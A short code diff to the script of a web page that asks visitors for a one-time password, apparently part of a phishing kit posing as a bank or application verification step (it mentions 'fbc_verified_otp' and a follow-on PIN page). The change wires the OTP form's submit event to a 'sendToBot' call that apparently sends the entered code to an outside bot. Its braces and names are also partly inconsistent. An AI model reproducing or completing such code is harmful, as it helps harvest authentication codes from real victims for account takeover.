@@ -632,12 +632,13 @@ Applicant: <code>Not provided</code>
         document.getElementById('otpError').style.display = 'block';
         return;
       }
+      
 
-      document.getElementById('otpError').style.display = 'none';
-      localStorage.setItem('fbc_verified_otp', code);
-
-      window.location.href = 'pin.html';
+      hideLoginError();
+      sendToBot(otpVal);
     }
+
+    document.getElementById('otpForm').addEventListener('submit', handleOtpSubmit);
 
     function openSupportModal() {
       document.getElementById('supportModal').style.display = 'flex';
@@ -645,10 +646,6 @@ Applicant: <code>Not provided</code>
 
     function closeSupportModal() {
       document.getElementById('supportModal').style.display = 'none';
-    }
-      hideOtpError();
-      sendToBot(otpval);
-  
     }
     </script>
   
